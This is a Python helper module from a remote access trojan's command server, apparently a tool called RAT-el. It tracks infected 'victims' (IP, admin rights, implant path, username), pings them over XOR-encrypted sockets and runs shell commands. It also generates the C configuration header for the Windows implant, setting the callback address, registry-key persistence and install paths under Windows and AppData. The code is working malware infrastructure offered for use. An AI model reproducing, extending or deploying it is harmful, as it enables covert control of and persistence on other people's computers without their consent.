from colorama import Fore,Style
from subprocess import Popen
from subprocess import PIPE
from backports.pbkdf2 import pbkdf2_hmac
from prettytable import PrettyTable

import socket
import binascii


#CONSTANT:
NB_SESSION = 0
NB_SOCKET = 1
NB_IP = 2
NB_PORT = 3
NB_ALIVE = 4
NB_ADMIN = 5
NB_PATH = 6
NB_USERNAME = 7
NB_TOKEN = 8
NB_SELECT = 9  #When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False). This serves to avoid confusion when sending data. 
NB_CONNEXION = 10 

SOCK_TIMEOUT = 6

SPLIT = "|SPLIT|"
#session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token

def XOREncryption(data,key):

    result = ""
    char_xor = ""

    for x in range(len(data)):
       
        current = data[x]

        current_key  = key[x % len(key)]

        char_xor = chr(ord(current) ^ ord(current_key))
        
        result += char_xor

    return result


def generate_PBKDF2_key(password, salt="CISCOTHEBOSS",iteration=10000 ,length=512): #Generates the key to encrypt and decrypt data using the XOR algorithm.
    
    password = password.encode()
    salt = salt.encode()

    return binascii.hexlify(pbkdf2_hmac("sha256", password, salt, iteration, length)).decode("utf8")


def exec(command):
    with Popen(str(command), stdout=PIPE,stderr=PIPE,shell=True) as cmd:
        out,err = str(cmd.stdout.read(),"UTF8",errors="ignore"),str(cmd.stderr.read(),"UTF8",errors="ignore")
        if not err:
            print(out)
            return out
        else:
            print(err)
            return err


def printColor(status,message):
    ERROR_COLOR = "\033[31m" #red
    HELP_COLOR = "\033[35m" #magenra
    TERMINAL_COLOR = "\033[34m" #blue
    INFO_COLOR =  "\033[33m"
    ARRAY_COLOR = "\033[36m" #cayen
    SUCCESSFULLY_COLOR = "\033[32m" #green

    RESET_COLOR = Style.RESET_ALL

    if status == "error":
        print(ERROR_COLOR+message+TERMINAL_COLOR)
    elif status == "information":
        print(INFO_COLOR+message+TERMINAL_COLOR)
    elif status == "help":
        print(HELP_COLOR+message+TERMINAL_COLOR)
    elif status == "successfully":
        print(SUCCESSFULLY_COLOR+message+TERMINAL_COLOR)


def areYouSure():
    #test the input is y or n and return True if yes else return False.

    inp = str(input("YesOrNo> ")).lower()
    print("\n")
    if(inp == "y" or inp == "yes"):
        return True
    
    elif(inp == "n" or inp == "no"):
        return False
    else:
        printColor("error","[-] Unknown argument.\n")
        return False


def printAllTarget():
    #Print all target.
    from .handler import Handler
    
    ptable = PrettyTable() #Ascii tables dynamic.
    ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.

    for key in Handler.dict_conn.keys():
        ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])

    print(Fore.GREEN,(ptable),Fore.BLUE)


def pingAllTarget(dict_conn,checkconn_objt , number_of_times=int() ,ping_string="is_life?"):
    #ping all the machine is determines whether the machine is alive or dead. 
    from .handler import Handler

    

    for key in dict_conn.keys():
                        
        if(dict_conn[key][NB_ALIVE] ==True and dict_conn[key][NB_SOCKET] ==False):
            print("\n\n\nChange value Is he alive true to false.")
            dict_conn[key][NB_ALIVE] = False
    
        if(dict_conn[key][NB_ALIVE] and bool(dict_conn[key][NB_SOCKET]) and not dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)
            try:
                dict_conn[key][NB_SOCKET].send(XOREncryption(ping_string, Handler.PBKDF2_Key, ).encode("utf-16-le"))

            except ConnectionError as connerr: #If the connection does not answer
                if(Handler.status_connection_display):
                    printColor("information","[-] Client number {} {}:{} was disconnected.".format(dict_conn[key][NB_SESSION], dict_conn[key][NB_IP], dict_conn[key][NB_PORT]))

                else:
                    pass
                checkconn_objt.connexionIsDead(key) #Change status to dead (False)

        else:#If the connection is dead
            #connexion is dead no send msg
            pass


def myBanner():
    return """
 ███████████     █████████   ███████████                     ████      █████████                                                   
░░███░░░░░███   ███░░░░░███ ░█░░░███░░░█                    ░░███     ███░░░░░███                                                  
 ░███    ░███  ░███    ░███ ░   ░███  ░              ██████  ░███    ░███    ░░░   ██████  ████████  █████ █████  ██████  ████████ 
 ░██████████   ░███████████     ░███     ██████████ ███░░███ ░███    ░░█████████  ███░░███░░███░░███░░███ ░░███  ███░░███░░███░░███
 ░███░░░░░███  ░███░░░░░███     ░███    ░░░░░░░░░░ ░███████  ░███     ░░░░░░░░███░███████  ░███ ░░░  ░███  ░███ ░███████  ░███ ░░░ 
 ░███    ░███  ░███    ░███     ░███               ░███░░░   ░███     ███    ░███░███░░░   ░███      ░░███ ███  ░███░░░   ░███     
 █████   █████ █████   █████    █████              ░░██████  █████   ░░█████████ ░░██████  █████      ░░█████   ░░██████  █████    
░░░░░   ░░░░░ ░░░░░   ░░░░░    ░░░░░                ░░░░░░  ░░░░░     ░░░░░░░░░   ░░░░░░  ░░░░░        ░░░░░     ░░░░░░  ░░░░░   BETA                                                                                                                                                                                                                                                                                                                
"""


def commonHeader():
    header = """
#ifndef COMMON_H
#define COMMON_H
//default header
#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "192.168.0.98" //Ip of server
#define PORT 8888 //Port of server
#define AUTO_PERSISTENCE false
#define TIMEOUT 3000//Seconds for reconnect to server during a disconnection
#define NAME_KEY_REGISTER  "win64" 
#define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm

#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH

// DO NOT TOUCH:
#define TIMEOUT_CREATE_PROC  10000
#define BUFFER_LEN 4096
#define BUFFER_EXEC 1024 //Buffer for exec
#define TIMEOUT_SOCK 5 
#define TIMEOUT_SOCK_RECONNECT 2000// timeout between each connection
#define SLEEP_RECV 200 
#define TIMEOUT_POPEN 5000 
#define MICRO_SLEEP 100 //micro sleep for timeout
#define SPLIT "|SPLIT|" 


#endif
"""
    return header

def customHeader(ip, auto, port, reco, registry, key): 
    #In order not to have an error you need 4 \.
    #Example C:\ = C:\\\\
    header = """
#ifndef COMMON_H
#define COMMON_H

#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "{}" //Ip of server
#define PORT {} //Port of server
#define AUTO_PERSISTENCE {}
#define TIMEOUT {} // Seconds for reconnect to server during a disconnection
#define NAME_KEY_REGISTER  "{}" 
#define XOR_KEY "{}" //The key to encrypt and decrypt data using the XOR algorithm


// DO NOT TOUCH:
#define TIMEOUT_CREATE_PROC 10000
#define BUFFER_EXEC 1024 //Buffer for exec
#define BUFFER_LEN 4096
#define TIMEOUT_SOCK 5 
#define TIMEOUT_SOCK_RECONNECT 2000// timeout between each connection
#define SLEEP_RECV 200
#define MICRO_SLEEP 100 //micro sleep for timeout
#define SPLIT "|SPLIT|" 


#endif

""".format(ip, port, auto, reco, registry,key)

    return header
